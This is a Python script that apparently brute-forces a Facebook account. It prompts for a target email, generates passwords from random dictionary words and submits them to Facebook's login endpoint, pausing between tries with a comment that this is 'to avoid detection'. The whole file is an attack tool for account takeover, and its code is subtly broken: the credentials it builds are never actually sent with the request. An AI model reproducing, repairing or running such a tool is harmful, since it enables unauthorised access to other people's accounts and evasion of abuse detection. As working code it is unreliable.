import urllib3
import time
import random
import nltk
import urllib.parse

urllib3.disable_warnings()

# Initialize NLTK words corpus
nltk.download('words')
english_words = set(word.lower() for word in nltk.corpus.words.words())

class FacebookLogin:
    def __init__(self, user):
        self.user = user
        self.http = urllib3.PoolManager()                                                                                                                                        
    def login(self, password):
        params = urllib.parse.urlencode({'email': self.user, 'pass': password})
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        # Now login
        print('Trying password:', password)
        try:
            res = self.http.request('POST', "https://www.facebook.com/login.php?m=m&refsrc=http://m.facebook.com/home>")
            if b'logout.php' in res.data:
                print("Login successful! Password:", password)
                return True
            else:
                print("Login failed for password:", password)
                return False
        except Exception as e:
            print(f"An error occurred: {e}")
            return False

def main():
    min_words = int(input("Enter the minimum number of words for the password: "))
    max_words = int(input("Enter the maximum number of words for the password: "))

    fb_user = input('Enter your Facebook email: ')
    max_attempts = int(input('Enter the maximum number of attempts: '))

    success = False
    tried_passwords = set()
    attempt = 0
    while not success and attempt < max_attempts:
        # Generate a random password
        password = generate_password(min_words, max_words)
        if password not in tried_passwords:
            fblogin = FacebookLogin(fb_user)
            if fblogin.login(password):
                success = True
                break
            tried_passwords.add(password)
            attempt += 1
        time.sleep(2)  # Add a delay to avoid detection

    if not success:
        print("Failed to find the correct password within the maximum number of attempts.")

def generate_password(min_words, max_words):
    """Generate a random password without spaces"""
    word_list = nltk.corpus.words.words()
    password = ''
    num_words = random.randint(min_words, max_words)
    while len(password) < 20:  # Adjust the length limit as needed
        chosen_words = random.sample(word_list, num_words)
        candidate_password = ''.join(chosen_words)
        if len(candidate_password) <= 20:  # Adjust the length limit as needed
            password = candidate_password
            break
    return password

if __name__ == '__main__':
    main()
